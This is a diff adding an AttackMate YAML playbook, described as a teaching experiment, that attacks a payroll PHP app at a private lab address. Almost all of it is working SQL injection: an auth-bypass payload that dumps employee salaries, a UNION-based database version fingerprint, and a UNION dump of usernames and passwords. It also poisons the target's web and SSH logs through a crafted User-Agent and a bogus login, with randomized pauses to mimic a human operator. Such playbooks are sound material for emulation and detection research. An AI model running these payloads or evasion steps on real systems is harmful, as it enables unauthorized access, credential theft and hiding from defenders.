@@ -1,0 +1,131 @@
+#
+# Author: AttackMate Initial-Access experiment (MIRANDA teaching example)
+# Description:
+#     Initial access by SQL injection in the payroll web app (payroll_app.php). The user
+#     field is injectable and the app renders a 4-column table, so every UNION payload
+#     returns four columns. Three iterative injections: auth bypass / data disclosure
+#     (dumps the employee table), a DBMS version fingerprint, then a credential dump
+#     whose plaintext user/pass rows match the system SSH logins.
+#
+#     Tactic flow: Initial Access (SQLi) -> Discovery (DB fingerprint) -> Credential Access
+#     (Defense Evasion runs throughout: the log-injection marker rides every step.)
+#
+# AUTHORIZED USE ONLY:
+#     Run this only against systems you own or have explicit written permission to test.
+#
+vars:
+  TARGET: 172.28.128.3
+  PAYROLL_URL: http://172.28.128.3/payroll_app.php
+  # Log-injection marker. Riding it in the User-Agent header poisons Apache's
+  # access.log (%{User-Agent}i) on the target, where auditd/SIEM can pick it up.
+  # It is ALSO appended as a trailing SQL comment (...#$INJECTION) on each payload,
+  # so the same token lands in the MySQL general_log - a join key between the two logs.
+  # Space-free single token: keeps it greppable as one field across access.log /
+  # auth.log / auditd, and the Phase 0 bogus SSH username lands cleanly in auth.log.
+  INJECTION: "this_is_the_injection"
+
+commands:
+
+  # ===================== Phase 0: pre-exploit log poisoning =====================
+  - type: http-client
+    cmd: GET
+    url: http://$TARGET/?probe=1
+    useragent: "$INJECTION"
+    exit_on_error: False
+    metadata:
+      description: "Benign-looking GET whose User-Agent seeds the marker into the Apache access log"
+      techniques: "T1562.006"
+      tactics: "Defense Evasion"
+
+  - type: sleep
+    seconds: 4
+    min_sec: 1
+    random: True
+    metadata:
+      description: "Human-paced jitter between the two probes"
+
+  - type: ssh
+    cmd: id
+    username: "$INJECTION"
+    password: "x"
+    hostname: $TARGET
+    interactive: False
+    exit_on_error: False
+    metadata:
+      description: "Bogus SSH username injection -> poisons auth.log (Invalid user ...)"
+      techniques: "T1110.001,T1562.006"
+      tactics: "Credential Access,Defense Evasion"
+
+  # ---- Injection 1: auth bypass -> employee table (Username, First Name, Last Name, Salary)
+  - type: http-client
+    cmd: POST
+    url: $PAYROLL_URL
+    useragent: "$INJECTION"
+    data:
+      user: "' OR 1=1#$INJECTION"
+      password: "x"
+      s: "Login"
+    save: /tmp/payroll_employees.html
+    metadata:
+      description: "SQLi auth-bypass; dumps the employee table; User-Agent poisons the Apache access log"
+      techniques: "T1190,T1562.006"
+      tactics: "Initial Access,Defense Evasion"
+
+  - type: debug
+    cmd: "[payroll] employee table (4 cols: user/first/last/salary) -> $RESULT_STDOUT"
+    metadata:
+      description: "Print the employee rows (data returned = successful injection)"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before the next injection (human pacing)"
+
+  # ---- Injection 2: DBMS version fingerprint (4-col UNION; @@version shows in the Salary column)
+  - type: http-client
+    cmd: POST
+    url: $PAYROLL_URL
+    useragent: "$INJECTION"
+    data:
+      user: "' UNION SELECT null, null, null,@@version#$INJECTION"
+      password: "x"
+      s: "Login"
+    save: /tmp/payroll_version.html
+    metadata:
+      description: "UNION-based DBMS version fingerprint (@@version); User-Agent poisons the access log"
+      techniques: "T1190,T1082,T1562.006"
+      tactics: "Initial Access,Discovery,Defense Evasion"
+
+  - type: debug
+    cmd: "[payroll] MySQL version (read the Salary column) -> $RESULT_STDOUT"
+    metadata:
+      description: "Print the version row (expect 5.5.60-0ubuntu0.14.04.1)"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before the credential dump (human pacing)"
+
+  # ---- Injection 3: credential dump from `users` (username -> Last Name col, password -> Salary col)
+  - type: http-client
+    cmd: POST
+    url: $PAYROLL_URL
+    useragent: "$INJECTION"
+    data:
+      user: "' OR 1=1 UNION SELECT null,null,username,password FROM users#$INJECTION"
+      password: "x"
+      s: "Login"
+    save: /tmp/payroll_creds.html
+    metadata:
+      description: "UNION-based credential dump from the users table; User-Agent poisons the access log"
+      techniques: "T1190,T1212,T1562.006"
+      tactics: "Initial Access,Credential Access,Defense Evasion"
+
+  - type: debug
+    cmd: "[payroll] dumped username/password pairs (match the SSH logins) -> $RESULT_STDOUT"
+    metadata:
+      description: "Print the credential rows (plaintext user/pass = SSH creds)"
